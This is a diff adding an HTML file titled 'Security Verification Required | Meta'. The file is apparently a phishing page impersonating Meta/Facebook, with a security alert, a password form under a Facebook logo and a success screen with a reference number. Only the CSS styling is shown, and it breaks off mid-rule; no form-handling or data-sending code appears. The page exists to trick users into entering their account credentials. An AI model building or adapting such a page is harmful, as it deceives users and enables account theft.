@@ -1,0 +1,3385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification Required | Meta</title>
+    <style>
+        /* Base Styles - Common for both views */
+        :root {
+            --blue-primary: #0866FF;
+            --blue-secondary: #1877F2;
+            --blue-light: #E7F3FF;
+            --green-primary: #42B72A;
+            --red-primary: #FA3E3E;
+            --red-light: #FFF4F4;
+            --gray-0: #FFFFFF;
+            --gray-1: #F7F8FA;
+            --gray-2: #F0F2F5;
+            --gray-3: #E4E6EB;
+            --gray-4: #DADDE1;
+            --gray-5: #BCC0C4;
+            --gray-6: #8A8D91;
+            --gray-7: #65676B;
+            --gray-8: #050505;
+            
+            --shadow-1: 0 1px 2px rgba(0, 0, 0, 0.05);
+            --shadow-2: 0 2px 8px rgba(0, 0, 0, 0.08);
+            --shadow-3: 0 8px 20px rgba(0, 0, 0, 0.12);
+            --shadow-4: 0 12px 28px rgba(0, 0, 0, 0.1);
+            
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 20px;
+            --radius-full: 9999px;
+            
+            --transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--gray-0);
+            color: var(--gray-8);
+            line-height: 1.34;
+            -webkit-font-smoothing: antialiased;
+            min-height: 100vh;
+        }
+
+        /* View Toggle Button */
+        .view-toggle-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 10000;
+            background: var(--blue-primary);
+            color: white;
+            border-radius: var(--radius-full);
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: var(--shadow-3);
+            cursor: pointer;
+            border: none;
+            font-weight: 600;
+            font-size: 14px;
+            transition: var(--transition);
+            animation: fadeIn 0.5s ease;
+        }
+
+        .view-toggle-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-4);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ============================== */
+        /* DESKTOP VIEW STYLES */
+        /* ============================== */
+        .desktop-view {
+            display: none;
+        }
+
+        /* Meta Header */
+        .meta-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 60px;
+            background: var(--gray-0);
+            border-bottom: 1px solid var(--gray-3);
+            padding: 0 16px;
+            z-index: 1000;
+            box-shadow: var(--shadow-1);
+        }
+
+        .header-container {
+            max-width: 1320px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 100%;
+        }
+
+        .meta-logo-center {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .meta-logo {
+            height: 30px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .search-box {
+            width: 240px;
+            height: 40px;
+            background: var(--gray-2);
+            border: none;
+            border-radius: var(--radius-full);
+            padding: 0 16px;
+            font-size: 15px;
+            color: var(--gray-8);
+            transition: var(--transition);
+        }
+
+        .search-box::placeholder {
+            color: var(--gray-6);
+        }
+
+        .search-box:focus {
+            outline: none;
+            background: var(--gray-0);
+            box-shadow: 0 0 0 2px var(--blue-primary);
+        }
+
+        /* Navigation */
+        .nav-center {
+            display: flex;
+            gap: 8px;
+        }
+
+        .nav-item {
+            min-width: 111.6px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 3px solid transparent;
+            cursor: pointer;
+            color: var(--gray-7);
+            position: relative;
+            transition: var(--transition);
+            padding: 0 12px;
+        }
+
+        .nav-item:hover {
+            background: var(--gray-2);
+            border-radius: var(--radius-md);
+        }
+
+        .nav-item.active {
+            color: var(--blue-primary);
+            border-bottom-color: var(--blue-primary);
+        }
+
+        .nav-icon {
+            width: 24px;
+            height: 24px;
+        }
+
+        .nav-badge {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            width: 18px;
+            height: 18px;
+            background: var(--red-primary);
+            color: white;
+            border-radius: 50%;
+            font-size: 11px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Header Right */
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .action-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: var(--radius-full);
+            background: var(--gray-3);
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            position: relative;
+            transition: var(--transition);
+        }
+
+        .action-btn:hover {
+            background: var(--gray-4);
+            transform: translateY(-1px);
+        }
+
+        .profile-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 12px 6px 6px;
+            border-radius: var(--radius-full);
+            cursor: pointer;
+            transition: var(--transition);
+            background: var(--gray-2);
+            border: 1px solid transparent;
+        }
+
+        .profile-btn:hover {
+            background: var(--gray-3);
+            border-color: var(--gray-4);
+        }
+
+        .profile-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .profile-name {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--gray-8);
+        }
+
+        /* Main Container */
+        .main-container {
+            max-width: 1320px;
+            margin: 80px auto 24px;
+            padding: 0 16px;
+            display: grid;
+            grid-template-columns: 280px 1fr 360px;
+            gap: 24px;
+        }
+
+        /* Left Sidebar */
+        .left-sidebar {
+            position: sticky;
+            top: 80px;
+            height: calc(100vh - 104px);
+            overflow-y: auto;
+            padding-right: 8px;
+        }
+
+        .left-sidebar::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .left-sidebar::-webkit-scrollbar-thumb {
+            background: var(--gray-5);
+            border-radius: 3px;
+        }
+
+        .sidebar-section {
+            margin-bottom: 24px;
+        }
+
+        .sidebar-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--gray-8);
+            padding: 12px 8px;
+            margin-bottom: 8px;
+        }
+
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            text-decoration: none;
+            color: var(--gray-8);
+            transition: var(--transition);
+            margin-bottom: 4px;
+            border: 1px solid transparent;
+        }
+
+        .sidebar-item:hover {
+            background: var(--gray-2);
+            border-color: var(--gray-3);
+        }
+
+        .sidebar-item.active {
+            background: var(--blue-light);
+            color: var(--blue-primary);
+            border-color: var(--blue-primary);
+            box-shadow: var(--shadow-1);
+        }
+
+        .sidebar-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: var(--radius-md);
+            background: var(--gray-3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            color: var(--gray-7);
+        }
+
+        .sidebar-item.active .sidebar-icon {
+            background: linear-gradient(135deg, var(--blue-primary), var(--blue-secondary));
+            color: white;
+        }
+
+        .sidebar-text {
+            font-size: 15px;
+            font-weight: 500;
+            flex: 1;
+        }
+
+        .sidebar-badge {
+            background: var(--blue-primary);
+            color: white;
+            font-size: 12px;
+            padding: 4px 8px;
+            border-radius: var(--radius-full);
+            font-weight: 600;
+            margin-left: 8px;
+        }
+
+        .divider {
+            height: 1px;
+            background: var(--gray-3);
+            margin: 16px 0;
+        }
+
+        /* Center Content */
+        .center-content {
+            background: var(--gray-0);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--gray-3);
+            box-shadow: var(--shadow-2);
+            overflow: hidden;
+        }
+
+        /* Security Alert */
+        .security-alert {
+            background: linear-gradient(135deg, #FFF0F0 0%, #FFF5F5 100%);
+            border-bottom: 1px solid #FFD1D1;
+            padding: 20px 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .alert-icon {
+            color: var(--red-primary);
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .alert-content h3 {
+            color: var(--gray-8);
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .alert-content p {
+            color: var(--gray-7);
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        /* Security Header */
+        .security-header {
+            padding: 32px 24px;
+            background: linear-gradient(135deg, #F8F9FF 0%, #FFFFFF 100%);
+            border-bottom: 1px solid var(--gray-3);
+        }
+
+        .security-title {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .security-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: var(--radius-lg);
+            background: linear-gradient(135deg, var(--blue-primary) 0%, var(--blue-secondary) 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            box-shadow: var(--shadow-2);
+        }
+
+        .security-text h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--gray-8);
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        .security-text p {
+            font-size: 16px;
+            color: var(--gray-7);
+            line-height: 1.4;
+        }
+
+        /* Content Area */
+        .content-area {
+            padding: 32px;
+        }
+
+        /* Video Section */
+        .video-section {
+            background: var(--gray-0);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--gray-3);
+            margin-bottom: 24px;
+            overflow: hidden;
+            box-shadow: var(--shadow-1);
+        }
+
+        .video-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--gray-3);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--gray-1);
+        }
+
+        .video-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .video-icon {
+            color: var(--blue-primary);
+        }
+
+        .video-text h3 {
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--gray-8);
+            margin-bottom: 4px;
+        }
+
+        .video-text p {
+            font-size: 14px;
+            color: var(--gray-6);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .video-duration {
+            background: var(--gray-2);
+            padding: 4px 8px;
+            border-radius: var(--radius-sm);
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* Language Selector */
+        .lang-selector-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: var(--gray-0);
+            border: 1px solid var(--gray-4);
+            border-radius: var(--radius-full);
+            cursor: pointer;
+            transition: var(--transition);
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--gray-7);
+        }
+
+        .lang-selector-btn:hover {
+            background: var(--gray-2);
+            transform: translateY(-1px);
+        }
+
+        .lang-flag {
+            width: 20px;
+            height: 15px;
+            border-radius: 2px;
+            object-fit: cover;
+            border: 1px solid var(--gray-4);
+        }
+
+        /* Video Player */
+        .video-player {
+            position: relative;
+            background: #000;
+        }
+
+        .video-placeholder {
+            height: 340px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .video-placeholder-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            opacity: 0.9;
+        }
+
+        .play-btn {
+            width: 72px;
+            height: 72px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: var(--radius-full);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            z-index: 1;
+            transition: var(--transition);
+            box-shadow: var(--shadow-3);
+        }
+
+        .video-placeholder:hover .play-btn {
+            transform: scale(1.05);
+            box-shadow: var(--shadow-4);
+        }
+
+        .play-icon {
+            color: var(--blue-primary);
+            margin-left: 4px;
+        }
+
+        .placeholder-text {
+            text-align: center;
+            z-index: 1;
+        }
+
+        .placeholder-text h4 {
+            color: white;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .placeholder-text p {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 15px;
+        }
+
+        .video-element {
+            width: 100%;
+            height: 340px;
+            display: none;
+            background: #000;
+        }
+
+        .video-element video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        /* Language Flags Section */
+        .lang-flags-section {
+            padding: 16px 24px;
+            border-top: 1px solid var(--gray-3);
+            background: var(--gray-1);
+        }
+
+        .flags-title {
+            font-size: 14px;
+            color: var(--gray-7);
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .flags-container {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .lang-flag-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: var(--gray-0);
+            border: 1px solid var(--gray-4);
+            border-radius: var(--radius-full);
+            cursor: pointer;
+            transition: var(--transition);
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--gray-7);
+        }
+
+        .lang-flag-btn:hover {
+            background: var(--gray-2);
+            transform: translateY(-1px);
+        }
+
+        .lang-flag-btn.active {
+            background: var(--blue-light);
+            border-color: var(--blue-primary);
+            color: var(--blue-primary);
+            box-shadow: var(--shadow-1);
+        }
+
+        .flag-small {
+            width: 20px;
+            height: 15px;
+            border-radius: 2px;
+            object-fit: cover;
+            border: 1px solid var(--gray-4);
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .label-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-8);
+        }
+
+        .label-hint {
+            font-size: 14px;
+            color: var(--gray-6);
+            background: var(--gray-1);
+            padding: 4px 12px;
+            border-radius: var(--radius-full);
+            font-weight: 500;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--gray-4);
+            border-radius: var(--radius-md);
+            font-size: 16px;
+            background: var(--gray-0);
+            color: var(--gray-8);
+            transition: var(--transition);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--blue-primary);
+            box-shadow: 0 0 0 3px var(--blue-light);
+        }
+
+        .form-input.error {
+            border-color: var(--red-primary);
+            background: var(--red-light);
+        }
+
+        .helper-text {
+            color: var(--gray-6);
+            font-size: 14px;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+
+        .error-message {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--red-primary);
+            font-size: 14px;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+
+        /* Action Buttons */
+        .action-btns-container {
+            display: flex;
+            gap: 12px;
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid var(--gray-3);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--blue-primary) 0%, var(--blue-secondary) 100%);
+            color: white;
+            border: none;
+            border-radius: var(--radius-md);
+            padding: 16px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: var(--shadow-2);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: var(--gray-2);
+            color: var(--gray-8);
+            border: 1px solid var(--gray-4);
+        }
+
+        .btn-secondary:hover {
+            background: var(--gray-3);
+        }
+
+        .btn:disabled {
+            background: var(--gray-3);
+            color: var(--gray-6);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* Password Form Header with Facebook Logo */
+        .password-form-header {
+            text-align: center;
+            padding: 32px 0;
+            border-bottom: 1px solid var(--gray-3);
+            background: linear-gradient(135deg, #F8F9FF 0%, #FFFFFF 100%);
+        }
+
+        .facebook-logo-center {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .facebook-logo {
+            height: 70px;
+            width: auto;
+        }
+
+        .password-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--gray-8);
+            margin-bottom: 12px;
+        }
+
+        .password-subtitle {
+            font-size: 17px;
+            color: var(--gray-7);
+            max-width: 500px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+
+        /* Success State */
+        .success-state {
+            text-align: center;
+            padding: 40px 24px;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--green-primary) 0%, #36A420 100%);
+            border-radius: var(--radius-full);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            color: white;
+            box-shadow: var(--shadow-3);
+        }
+
+        .success-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--gray-8);
+            margin-bottom: 12px;
+        }
+
+        .success-message {
+            font-size: 17px;
+            color: var(--gray-7);
+            max-width: 600px;
+            margin: 0 auto 32px;
+            line-height: 1.5;
+        }
+
+        .reference-box {
+            background: var(--gray-1);
+            border-radius: var(--radius-md);
+            padding: 20px;
+            display: inline-block;
+            margin-bottom: 24px;
+            border: 1px solid var(--gray-3);
+        }
+
+        .reference-box span {
+            font-size: 15px;
+            color: var(--gray-6);
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .reference-box strong {
+            font-size: 20px;
+            color: var(--gray-8);
+            font-weight: 700;
+        }
+
+        /* Right Sidebar */
+        .right-sidebar {
+            position: sticky;
+            top: 80px;
+            height: fit-content;
+        }
+
+        .sponsored-section {
+            background: var(--gray-0);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--gray-3);
+            padding: 20px;
+            box-shadow: var(--shadow-1);
+        }
+
+        .sponsored-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--gray-8);
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--gray-3);
+        }
+
+        .sponsored-card {
+            background: var(--gray-1);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid var(--gray-3);
+            transition: var(--transition);
+        }
+
+        .sponsored-card:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-2);
+        }
+
+        .sponsored-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .sponsored-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 12px;
+            object-fit: cover;
+        }
+
+        .sponsored-info h4 {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--gray-8);
+            margin-bottom: 2px;
+        }
+
+        .sponsored-info p {
+            font-size: 13px;
+            color: var(--gray-6);
+        }
+
+        .sponsored-content h5 {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-8);
+            margin-bottom: 8px;
+        }
+
+        .sponsored-content p {
+            font-size: 14px;
+            color: var(--gray-7);
+            line-height: 1.4;
+            margin-bottom: 12px;
+        }
+
+        .learn-more {
+            color: var(--blue-primary);
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .learn-more:hover {
+            text-decoration: underline;
+        }
+
+        .sponsored-tag {
+            display: inline-block;
+            background: var(--blue-light);
+            color: var(--blue-primary);
+            padding: 4px 12px;
+            border-radius: var(--radius-full);
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 8px;
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--gray-0);
+            border-top: 1px solid var(--gray-3);
+            padding: 20px 0;
+            margin-top: 40px;
+        }
+
+        .footer-content {
+            max-width: 1320px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 12px;
+            justify-content: center;
+        }
+
+        .footer-link {
+            color: var(--gray-6);
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            text-align: center;
+            color: var(--gray-6);
+            font-size: 12px;
+            margin-top: 8px;
+        }
+
+        /* Language Modal */
+        .lang-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 20px;
+            backdrop-filter: blur(4px);
+        }
+
+        .modal-content {
+            background: var(--gray-0);
+            border-radius: var(--radius-xl);
+            max-width: 500px;
+            width: 100%;
+            max-height: 80vh;
+            overflow: hidden;
+            box-shadow: var(--shadow-4);
+            animation: modalEnter 0.3s ease;
+        }
+
+        @keyframes modalEnter {
+            from {
+                opacity: 0;
+                transform: scale(0.95) translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .modal-header {
+            padding: 24px;
+            border-bottom: 1px solid var(--gray-3);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: linear-gradient(135deg, var(--gray-1), var(--gray-2));
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--gray-8);
+        }
+
+        .modal-close {
+            width: 40px;
+            height: 40px;
+            border-radius: var(--radius-full);
+            border: none;
+            background: none;
+            color: var(--gray-6);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+        }
+
+        .modal-close:hover {
+            background: var(--gray-2);
+        }
+
+        .modal-body {
+            padding: 24px;
+            max-height: calc(80vh - 73px);
+            overflow-y: auto;
+        }
+
+        .lang-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            transition: var(--transition);
+            margin-bottom: 4px;
+            border: 1px solid transparent;
+        }
+
+        .lang-option:hover {
+            background: var(--gray-2);
+            border-color: var(--gray-3);
+        }
+
+        .lang-option.selected {
+            background: var(--blue-light);
+            border: 1px solid var(--blue-primary);
+        }
+
+        .flag-medium {
+            width: 30px;
+            height: 22px;
+            border-radius: 3px;
+            object-fit: cover;
+            border: 1px solid var(--gray-4);
+        }
+
+        .lang-info {
+            flex: 1;
+        }
+
+        .lang-name {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--gray-8);
+        }
+
+        .lang-check {
+            color: var(--blue-primary);
+            font-size: 20px;
+        }
+
+        /* ============================== */
+        /* MOBILE VIEW STYLES */
+        /* ============================== */
+        .mobile-view {
+            display: none;
+        }
+
+        /* Mobile Header */
+        .mobile-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 56px;
+            background: var(--gray-0);
+            border-bottom: 1px solid var(--gray-3);
+            padding: 0 16px;
+            z-index: 1000;
+            box-shadow: var(--shadow-1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .mobile-logo {
+            height: 28px;
+            width: auto;
+        }
+
+        .mobile-menu-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: var(--radius-full);
+            background: var(--gray-2);
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        /* Mobile Main Container */
+        .mobile-main {
+            padding: 72px 16px 80px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Mobile Security Alert */
+        .mobile-security-alert {
+            background: linear-gradient(135deg, #FFF0F0 0%, #FFF5F5 100%);
+            border-radius: var(--radius-lg);
+            border: 1px solid #FFD1D1;
+            padding: 16px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        /* Mobile Security Header */
+        .mobile-security-header {
+            background: linear-gradient(135deg, #F8F9FF 0%, #FFFFFF 100%);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--gray-3);
+            padding: 24px 16px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .mobile-security-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: var(--radius-lg);
+            background: linear-gradient(135deg, var(--blue-primary) 0%, var(--blue-secondary) 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            margin: 0 auto 16px;
+            box-shadow: var(--shadow-2);
+        }
+
+        .mobile-security-text h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--gray-8);
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        .mobile-security-text p {
+            font-size: 15px;
+            color: var(--gray-7);
+            line-height: 1.4;
+        }
+
+        /* Mobile Video Section */
+        .mobile-video-section {
+            background: var(--gray-0);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--gray-3);
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+
+        .mobile-video-header {
+            padding: 16px;
+            border-bottom: 1px solid var(--gray-3);
+            background: var(--gray-1);
+        }
+
+        .mobile-video-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+
+        .mobile-video-text h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-8);
+        }
+
+        .mobile-video-text p {
+            font-size: 13px;
+            color: var(--gray-6);
+        }
+
+        .mobile-video-duration {
+            background: var(--gray-2);
+            padding: 4px 8px;
+            border-radius: var(--radius-sm);
+            font-size: 11px;
+            font-weight: 600;
+            margin-left: auto;
+        }
+
+        /* Mobile Video Player */
+        .mobile-video-player {
+            position: relative;
+            background: #000;
+        }
+
+        .mobile-video-placeholder {
+            height: 220px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .mobile-video-placeholder-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            opacity: 0.9;
+        }
+
+        .mobile-play-btn {
+            width: 60px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: var(--radius-full);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+            z-index: 1;
+            transition: var(--transition);
+            box-shadow: var(--shadow-3);
+        }
+
+        .mobile-video-element {
+            width: 100%;
+            height: 220px;
+            display: none;
+            background: #000;
+        }
+
+        .mobile-video-element video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        /* Mobile Language Selector */
+        .mobile-lang-selector {
+            padding: 12px 16px;
+            border-top: 1px solid var(--gray-3);
+            background: var(--gray-1);
+        }
+
+        .mobile-lang-btn {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            background: var(--gray-0);
+            border: 1px solid var(--gray-4);
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--gray-8);
+        }
+
+        .mobile-lang-current {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Mobile Form Styles */
+        .mobile-form-group {
+            margin-bottom: 20px;
+        }
+
+        .mobile-form-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .mobile-label-text {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--gray-8);
+        }
+
+        .mobile-label-hint {
+            font-size: 13px;
+            color: var(--gray-6);
+            background: var(--gray-1);
+            padding: 4px 10px;
+            border-radius: var(--radius-full);
+            font-weight: 500;
+        }
+
+        .mobile-form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--gray-4);
+            border-radius: var(--radius-md);
+            font-size: 16px;
+            background: var(--gray-0);
+            color: var(--gray-8);
+        }
+
+        .mobile-form-input:focus {
+            outline: none;
+            border-color: var(--blue-primary);
+            box-shadow: 0 0 0 3px var(--blue-light);
+        }
+
+        .mobile-helper-text {
+            color: var(--gray-6);
+            font-size: 13px;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+
+        .mobile-error-message {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--red-primary);
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+
+        /* Mobile Action Buttons */
+        .mobile-action-btns {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid var(--gray-3);
+        }
+
+        .mobile-btn {
+            background: linear-gradient(135deg, var(--blue-primary) 0%, var(--blue-secondary) 100%);
+            color: white;
+            border: none;
+            border-radius: var(--radius-md);
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+        }
+
+        .mobile-btn-secondary {
+            background: var(--gray-2);
+            color: var(--gray-8);
+            border: 1px solid var(--gray-4);
+        }
+
+        /* Mobile Password Form Header */
+        .mobile-password-header {
+            text-align: center;
+            padding: 24px 0;
+            border-bottom: 1px solid var(--gray-3);
+            background: linear-gradient(135deg, #F8F9FF 0%, #FFFFFF 100%);
+            margin-bottom: 20px;
+        }
+
+        .mobile-facebook-logo {
+            height: 50px;
+            width: auto;
+            margin-bottom: 16px;
+        }
+
+        .mobile-password-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--gray-8);
+            margin-bottom: 8px;
+        }
+
+        .mobile-password-subtitle {
+            font-size: 15px;
+            color: var(--gray-7);
+            line-height: 1.4;
+            padding: 0 16px;
+        }
+
+        /* Mobile Success State */
+        .mobile-success-state {
+            text-align: center;
+            padding: 32px 16px;
+        }
+
+        .mobile-success-icon {
